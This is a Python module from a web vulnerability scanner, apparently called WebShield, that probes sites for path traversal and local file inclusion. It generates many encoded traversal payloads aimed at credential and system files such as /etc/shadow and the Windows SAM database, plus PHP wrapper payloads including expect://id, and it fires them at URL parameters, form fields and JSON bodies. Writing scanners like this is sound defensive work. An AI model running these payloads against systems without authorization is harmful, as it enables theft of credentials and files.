"""
Path Traversal / LFI / RFI Scanner — Professional Grade
=========================================================
Coverage:
  • All major traversal encodings (dot-slash, URL-encoded, double-encoded,
    Unicode, overlong UTF-8, UNC paths, Windows drive letters)
  • WAF bypass: null bytes, suffix tricks, path normalization
  • php:// and data:// stream wrappers (PHP LFI → RCE chain surface)
  • Log poisoning indicator (checks /proc/self/fd, /var/log/*)
  • Windows IIS / ASP.NET traversal variants
  • Form-field LFI (file upload inputs + text params)
  • Absolute path injection (skip traversal entirely)
  • Content-length anomaly detection for blind/binary LFI
  • UNIX /proc/* leakage (environ, cmdline, version, net/tcp)
  • OS-specific file targets for confirmation
  • Confidence levels: High (content match) / Medium (base64/size anomaly)

CWE  : CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
OWASP: A01:2021 – Broken Access Control
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import base64
import re
from typing import Any, Dict, List, Optional, Tuple

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability,
    VulnType,
    Severity,
    CVSSv3,
    AttackVector,
    AttackComplexity,
    PrivilegesRequired,
    UserInteraction,
    Scope,
    Impact,
)

# ---------------------------------------------------------------------------
# CVSS profiles
# ---------------------------------------------------------------------------

_CVSS_HIGH = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.LOW,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.UNCHANGED,
    confidentiality=Impact.HIGH,
    integrity=Impact.NONE,
    availability=Impact.NONE,
)

_CVSS_MEDIUM = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.HIGH,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.UNCHANGED,
    confidentiality=Impact.LOW,
    integrity=Impact.NONE,
    availability=Impact.NONE,
)

# ---------------------------------------------------------------------------
# Shared metadata
# ---------------------------------------------------------------------------

_CWE = "CWE-22"
_OWASP = "A01:2021 - Broken Access Control"
_REFS = [
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
    "https://cwe.mitre.org/data/definitions/22.html",
    "https://portswigger.net/web-security/file-path-traversal",
    "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
]
_REMEDIATION = (
    "1. Never pass user-controlled input directly to filesystem operations.\n"
    "2. Resolve the canonical path and verify it starts with the expected root "
    "(e.g., realpath() in PHP, os.path.realpath() in Python).\n"
    "3. Use a strict allowlist of permitted filenames/paths.\n"
    "4. Disable dangerous PHP stream wrappers (allow_url_include=Off, "
    "allow_url_fopen=Off) in php.ini.\n"
    "5. Run the web server process under a restricted OS account with chroot.\n"
    "6. Strip null bytes and path components from all user-supplied filenames."
)

# ---------------------------------------------------------------------------
# Parameter name heuristic
# ---------------------------------------------------------------------------

_FILE_PARAM_RE = re.compile(
    r"(?i)\b("
    r"file|path|page|include|doc(?:ument)?|load|read|folder|"
    r"root|dir(?:ectory)?|show|template|view|content|resource|"
    r"lang(?:uage)?|locale|module|section|conf(?:ig)?|name|filename|"
    r"src|source|download|attachment|get|fetch|open|require|import|"
    r"skin|theme|style|layout|action|route|controller"
    r")\b",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Target files — pairs of (payload, detection_label)
# ---------------------------------------------------------------------------

# UNIX sensitive files
_UNIX_TARGETS: List[Tuple[str, str]] = [
    ("/etc/passwd",             "UNIX: /etc/passwd"),
    ("/etc/shadow",             "UNIX: /etc/shadow"),
    ("/etc/hosts",              "UNIX: /etc/hosts"),
    ("/etc/hostname",           "UNIX: /etc/hostname"),
    ("/etc/os-release",         "UNIX: /etc/os-release"),
    ("/proc/self/environ",      "UNIX: /proc/self/environ"),
    ("/proc/self/cmdline",      "UNIX: /proc/self/cmdline"),
    ("/proc/version",           "UNIX: /proc/version"),
    ("/proc/net/tcp",           "UNIX: /proc/net/tcp"),
    ("/var/log/apache2/access.log", "UNIX: Apache access log"),
    ("/var/log/nginx/access.log",   "UNIX: nginx access log"),
    ("/var/log/auth.log",           "UNIX: auth log"),
]

# Windows sensitive files
_WIN_TARGETS: List[Tuple[str, str]] = [
    ("C:\\Windows\\win.ini",                     "Windows: win.ini"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows: hosts file"),
    ("C:\\boot.ini",                              "Windows: boot.ini"),
    ("C:\\Windows\\system32\\config\\SAM",        "Windows: SAM database"),
    ("C:\\inetpub\\wwwroot\\web.config",          "Windows: web.config"),
    ("C:\\Windows\\System32\\cmd.exe",            "Windows: cmd.exe"),
]

# PHP stream wrapper targets
_PHP_WRAPPERS: List[Tuple[str, str]] = [
    ("php://filter/convert.base64-encode/resource=/etc/passwd",      "PHP wrapper: /etc/passwd base64"),
    ("php://filter/convert.base64-encode/resource=../index.php",     "PHP wrapper: index.php source"),
    ("php://filter/convert.base64-encode/resource=../config.php",    "PHP wrapper: config.php source"),
    ("php://filter/convert.base64-encode/resource=../../../../etc/passwd", "PHP wrapper: /etc/passwd (deep)"),
    ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "PHP wrapper (alt): /etc/passwd"),
    ("php://input",                                                    "PHP input wrapper"),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",        "PHP data wrapper: phpinfo()"),
    ("expect://id",                                                    "PHP expect wrapper: id"),
    ("zip://test.zip%23shell.php",                                    "PHP zip wrapper"),
    ("phar://test.phar/shell.php",                                    "PHP phar wrapper"),
]

# ---------------------------------------------------------------------------
# Traversal encoding variants — generated from each target path
# ---------------------------------------------------------------------------

def _traversal_variants(target: str, depths: List[int] = None) -> List[str]:
    """
    Generate all traversal encoding variants for a given target path.
    depths: list of directory depth values to prepend (e.g. [2, 3, 4, 5, 6])
    """
    if depths is None:
        depths = [2, 3, 4, 5, 6, 7]
    variants: List[str] = []
    # Strip leading slash for relative variants
    rel = target.lstrip("/").lstrip("\\")

    for depth in depths:
        prefix_unix  = "../" * depth
        prefix_win   = "..\\" * depth
        prefix_url   = "%2e%2e%2f" * depth
        prefix_dbl   = "%252e%252e%252f" * depth
        prefix_ov    = "%c0%af" * depth          # overlong UTF-8 /
        prefix_ov2   = "%c1%9c" * depth          # overlong UTF-8 \
        prefix_dots  = "..../" * depth           # four-dot bypass

        variants += [
            f"{prefix_unix}{rel}",
            f"{prefix_win}{rel.replace('/', '\\\\')}",
            f"{prefix_url}{rel}",
            f"{prefix_dbl}{rel}",
            f"{prefix_ov}{rel}",
            f"{prefix_ov2}{rel.replace('/', '%5c')}",
            f"{prefix_dots}{rel}",
            # Null byte suffix (some older PHP versions)
            f"{prefix_unix}{rel}%00",
            f"{prefix_unix}{rel}%00.jpg",
            f"{prefix_unix}{rel}\x00",
            # Backslash mix
            f"..\\..\\..\\..\\{rel}",
            # Absolute
            target,
            # Windows drive variants
            f"c:/{rel}" if "/" in target else "",
            f"C:\\{rel.replace('/', '\\')}" if "/" in target else "",
        ]

    # Remove empties and deduplicate
    return list(dict.fromkeys(v for v in variants if v))


# Pre-build payload+label list: [(payload, label, is_php_wrapper)]
_ALL_PAYLOADS: List[Tuple[str, str, bool]] = []

for _path, _label in _UNIX_TARGETS + _WIN_TARGETS:
    for _v in _traversal_variants(_path):
        _ALL_PAYLOADS.append((_v, _label, False))
    # Also add absolute path directly
    _ALL_PAYLOADS.append((_path, _label + " (absolute)", False))

for _wrapper, _label in _PHP_WRAPPERS:
    _ALL_PAYLOADS.append((_wrapper, _label, True))

# ---------------------------------------------------------------------------
# Detection patterns — strict to avoid FP
# ---------------------------------------------------------------------------

_DETECTION_PATTERNS: List[Tuple[re.Pattern, str]] = [
    # UNIX /etc/passwd
    (re.compile(r"root:x:0:0"),                         "UNIX: /etc/passwd root entry"),
    (re.compile(r"daemon:x:\d+:\d+:"),                  "UNIX: /etc/passwd daemon entry"),
    (re.compile(r"(?:nobody|www-data|apache):[^:]+:\d+:\d+:"), "UNIX: /etc/passwd web user"),
    # UNIX /etc/hosts
    (re.compile(r"127\.0\.0\.1\s+localhost"),            "UNIX/Windows: hosts file"),
    # UNIX /proc
    (re.compile(r"Linux\s+\S+\s+\d+\.\d+\.\d+"),        "UNIX: /proc/version"),
    (re.compile(r"PATH=(?:/[^:]+:)+"),                   "UNIX: /proc/self/environ PATH"),
    (re.compile(r"HOME=/(?:root|home/\w+)"),             "UNIX: /proc/self/environ HOME"),
    # Windows win.ini
    (re.compile(r"for 16-bit app support",    re.I),     "Windows: win.ini"),
    (re.compile(r"\[extensions\]",            re.I),     "Windows: win.ini [extensions]"),
    (re.compile(r"\[fonts\]",                 re.I),     "Windows: win.ini [fonts]"),
    # Windows boot.ini
    (re.compile(r"\[boot loader\]",           re.I),     "Windows: boot.ini"),
    (re.compile(r"\[operating systems\]",     re.I),     "Windows: boot.ini [operating systems]"),
    # Log file leakage
    (re.compile(r'"GET /[^"]*" \d{3} \d+'),              "Web server access log"),
    (re.compile(r"\d+\.\d+\.\d+\.\d+ - - \["),           "Apache/nginx combined log"),
    # Source code
    (re.compile(r"<\?php\s+[^\s]"),                      "PHP source code"),
    (re.compile(r"DB_PASSWORD\s*=\s*\S"),                "Env file: DB_PASSWORD"),
    (re.compile(r"APP_KEY=base64:"),                     "Laravel: APP_KEY"),
    (re.compile(r"SECRET_KEY\s*=\s*['\"]"),              "Django: SECRET_KEY"),
    # Web.config / config files
    (re.compile(r"<connectionStrings>",       re.I),     "Windows: web.config connectionStrings"),
    (re.compile(r"<add name=.+connectionString", re.I),  "Windows: web.config DB connection"),
]

_PATTERNS_ONLY = [p for p, _ in _DETECTION_PATTERNS]
_PATTERN_LABELS = {p: lbl for p, lbl in _DETECTION_PATTERNS}

# Base64 long block: likely php://filter encoded file content
_B64_BLOCK_RE = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")


# ===========================================================================
# Scanner
# ===========================================================================

class PathTraversalScanner(_ScannerBase):
    """
    Comprehensive Path Traversal / LFI / RFI scanner.

    Strategy:
      1. Identify candidate parameters via name heuristic.
      2. For each candidate, test traversal variants across all target files.
         Stop on first High-confidence hit per parameter.
      3. Test PHP stream wrappers (base64 filter chain) for PHP-specific LFI.
      4. Test form fields (text + file-type inputs).
      5. Content-length anomaly detection as Medium-confidence fallback.
    """

    name = "Path Traversal / LFI"

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        params = self._extract_url_params(url)

        file_params = [p for p in params if _FILE_PARAM_RE.search(p)]

        # --- URL parameter testing ---
        for param in file_params:
            # Get baseline response length for anomaly detection
            baseline_len = len(response.text) if response.text else 0
            found = await self._test_param(url, param, "GET", baseline_len)
            vulns.extend(found)
            if found and found[0].severity in (Severity.HIGH, Severity.CRITICAL):
                break  # High-confidence hit — no need to exhaust all params

        # --- Form field testing ---
        for form in forms:
            for inp in form.get("inputs", []):
                name = inp.get("name", "")
                if not name:
                    continue
                inp_type = (inp.get("type") or "text").lower()
                # Test text-like fields and file inputs
                if not (_FILE_PARAM_RE.search(name) or inp_type == "file"):
                    continue
                action = form.get("action", url)
                method = (form.get("method") or "GET").upper()
                found = await self._test_form_field(action, method, form, name)
                vulns.extend(found)
                if found:
                    break


        # ── JSON body path traversal (REST APIs) ────────────────────────────
        if not vulns:
            ct = (response.content_type or "").lower()
            if "json" in ct:
                found = await self._test_json_body_pt(url, response)
                vulns.extend(found)

        return vulns

    # -----------------------------------------------------------------------
    # URL parameter testing
    # -----------------------------------------------------------------------

    async def _test_param(
        self,
        url: str,
        param: str,
        method: str,
        baseline_len: int,
    ) -> List[Vulnerability]:
        tested_urls: set = set()

        for payload, label, is_wrapper in _ALL_PAYLOADS:
            injected = self._inject_param(url, param, payload)
            if injected in tested_urls:
                continue
            tested_urls.add(injected)

            resp = await self.client.get(injected)
            if resp is None:
                continue

            # --- High-confidence: content match ---
            match_label, match_text = self._match_patterns(resp.text)
            if match_label:
                vuln_type = (
                    VulnType.RFI if payload.startswith(("http://", "https://", "ftp://"))
                    else VulnType.LFI
                )
                return [self._build_vuln(
                    vuln_type=vuln_type,
                    title=f"{'Local' if vuln_type == VulnType.LFI else 'Remote'} File Inclusion — {match_label}",
                    description=(
                        f"Parameter '{param}' is vulnerable to path traversal / LFI. "
                        f"The server processed the payload '{payload}' and returned sensitive "
                        f"file contents in the HTTP response. "
                        f"An attacker can read arbitrary files on the server including "
                        f"credentials, configuration files, source code, and private keys, "
                        f"potentially leading to full server compromise."
                    ),
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"{match_label}: '{match_text[:120]}'",
                    method=method,
                    severity=Severity.HIGH,
                    cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE,
                    owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

            # --- Medium-confidence: PHP base64 filter chain ---
            if is_wrapper and "base64-encode" in payload:
                b64_match = _B64_BLOCK_RE.search(resp.text)
                if b64_match and len(b64_match.group(0)) > 80:
                    # Verify it decodes to something that looks like file content
                    decoded = self._try_b64_decode(b64_match.group(0))
                    if decoded and self._looks_like_file_content(decoded):
                        preview = decoded[:120].replace("\n", "\\n")
                        return [self._build_vuln(
                            vuln_type=VulnType.LFI,
                            title="PHP LFI via Stream Wrapper (php://filter) — Base64 Confirmed",
                            description=(
                                f"Parameter '{param}' is vulnerable to PHP LFI via the "
                                f"php://filter stream wrapper. The server returned a large "
                                f"base64-encoded block that decodes to file content. "
                                f"This technique bypasses filename-based restrictions and "
                                f"can be used to read any file the web server can access, "
                                f"including PHP source code and configuration files."
                            ),
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=(
                                f"Base64 block ({len(b64_match.group(0))} chars) decoded to: "
                                f"'{preview}'"
                            ),
                            method=method,
                            severity=Severity.HIGH,
                            cvss=_CVSS_HIGH,
                            remediation=_REMEDIATION,
                            references=_REFS,
                            cwe_id=_CWE,
                            owasp_category=_OWASP,
                            response_snippet=self._snippet(resp.text),
                            confidence="High",
                        )]

            # --- Medium-confidence: content-length anomaly ---
            if baseline_len > 50:
                resp_len = len(resp.text)
                # If response is dramatically larger (likely included file content)
                # and not matching any error patterns
                ratio = resp_len / baseline_len if baseline_len else 0
                if ratio > 3.0 and resp.status_code == 200 and resp_len > 500:
                    vulns_so_far = await self._content_anomaly_vuln(
                        url, param, payload, label, method,
                        baseline_len, resp_len, resp
                    )
                    if vulns_so_far:
                        return vulns_so_far

        return []

    # -----------------------------------------------------------------------
    # Form field testing
    # -----------------------------------------------------------------------

    async def _test_form_field(
        self,
        action: str,
        method: str,
        form: Dict[str, Any],
        param_name: str,
    ) -> List[Vulnerability]:
        # Use a reduced but representative subset for forms
        form_payloads = [
            (p, lbl, iw) for p, lbl, iw in _ALL_PAYLOADS
            if not iw  # skip PHP wrappers for form fields (rarely applicable)
        ][:40]

        for payload, label, _ in form_payloads:
            form_data = {
                inp["name"]: (
                    payload if inp["name"] == param_name
                    else inp.get("value", "test")
                )
                for inp in form.get("inputs", [])
                if inp.get("name")
            }

            if method == "POST":
                resp = await self.client.post(action, data=form_data)
            else:
                resp = await self.client.get(action, params=form_data)

            if resp is None:
                continue

            match_label, match_text = self._match_patterns(resp.text)
            if match_label:
                return [self._build_vuln(
                    vuln_type=VulnType.LFI,
                    title=f"Path Traversal / LFI in Form Field '{param_name}' — {match_label}",
                    description=(
                        f"Form field '{param_name}' at {action} ({method}) is vulnerable to "
                        f"path traversal. Sensitive file content was returned in the response."
                    ),
                    url=action,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"{match_label}: '{match_text[:120]}'",
                    method=method,
                    severity=Severity.HIGH,
                    cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE,
                    owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

        return []

    # -----------------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------------

    def _match_patterns(self, body: str) -> Tuple[str, str]:
        """Return (label, matched_text) for the first pattern that matches."""
        for pattern, label in _DETECTION_PATTERNS:
            m = pattern.search(body)
            if m:
                return label, m.group(0)
        return "", ""

    @staticmethod
    def _try_b64_decode(data: str) -> Optional[str]:
        """Attempt base64 decode; return decoded string or None."""
        try:
            padded = data + "=" * (-len(data) % 4)
            decoded = base64.b64decode(padded)
            return decoded.decode("utf-8", errors="replace")
        except Exception:
            return None

    @staticmethod
    def _looks_like_file_content(text: str) -> bool:
        """Heuristic: does the decoded text look like a real file?"""
        # /etc/passwd style
        if re.search(r"\w+:[^:]+:\d+:\d+:", text):
            return True
        # PHP source
        if "<?php" in text or "<?=" in text:
            return True
        # Windows INI
        if re.search(r"\[(?:fonts|extensions|boot loader)\]", text, re.I):
            return True
        # hosts file
        if re.search(r"127\.0\.0\.1\s+localhost", text):
            return True
        # .env file
        if re.search(r"[A-Z_]+=.{4,}", text) and text.count("=") > 2:
            return True
        return False

    async def _content_anomaly_vuln(
        self,
        url: str,
        param: str,
        payload: str,
        label: str,
        method: str,
        baseline_len: int,
        resp_len: int,
        resp: HTTPResponse,
    ) -> List[Vulnerability]:
        """Return a Medium-confidence finding based on content-length anomaly."""
        return [self._build_vuln(
            vuln_type=VulnType.LFI,
            title="Potential Path Traversal — Response Size Anomaly",
            description=(
                f"Parameter '{param}' returned a significantly larger response "
                f"({resp_len} bytes vs baseline {baseline_len} bytes, ratio "
                f"{resp_len / baseline_len:.1f}×) when injected with the path "
                f"traversal payload '{payload}'. This may indicate file content "
                f"was included in the response. Manual verification required."
            ),
            url=url,
            parameter=param,
            payload=payload,
            evidence=(
                f"Baseline: {baseline_len} bytes | Injected: {resp_len} bytes | "
                f"Target hint: {label}"
            ),
            method=method,
            severity=Severity.MEDIUM,
            cvss=_CVSS_MEDIUM,
            remediation=_REMEDIATION,
            references=_REFS,
            cwe_id=_CWE,
            owasp_category=_OWASP,
            response_snippet=self._snippet(resp.text),
            confidence="Medium",
        )]

    # ------------------------------------------------------------------
    # JSON body path traversal
    # ------------------------------------------------------------------

    async def _test_json_body_pt(
        self, url: str, response: "HTTPResponse"
    ) -> list:
        """Inject path traversal payloads into JSON body fields."""
        import json as _json

        try:
            data = _json.loads(response.text)
        except Exception:
            data = {}

        if not isinstance(data, dict):
            data = {}

        field_names = [k for k in data.keys() if isinstance(data[k], str)][:5]
        if not field_names:
            field_names = ["file", "path", "filename", "template", "page", "include"]

        for field in field_names:
            for (payload, _, _is_win) in _ALL_PAYLOADS[:8]:
                if _is_win:
                    continue  # Focus on Unix for JSON APIs
                test_body = dict(data)
                test_body[field] = payload

                resp = await self.client.post(
                    url,
                    json=test_body,
                    headers={"Content-Type": "application/json"},
                )
                if resp is None:
                    continue

                for pattern in _PATTERNS_ONLY:
                    m = pattern.search(resp.text)
                    if m:
                        return [self._build_vuln(
                            vuln_type=VulnType.LFI,
                            title="Path Traversal via JSON Body",
                            description=(
                                f"JSON field '{field}' at {url} is vulnerable to path traversal. "
                                f"The traversal sequence in the POST body caused the server to "
                                f"return file system content."
                            ),
                            url=url,
                            parameter=field,
                            payload=_json.dumps({field: payload}),
                            evidence=f"Matched: '{m.group(0)[:80]}'",
                            method="POST",
                            severity=Severity.HIGH,
                            remediation=(
                                "Validate and canonicalize all file paths. "
                                "Reject paths containing '../' sequences. "
                                "Use realpath() and check the result is within allowed directories."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                            cwe_id="CWE-22",
                            owasp_category="A01:2021 - Broken Access Control",
                            confidence="High",
                        )]
        return []
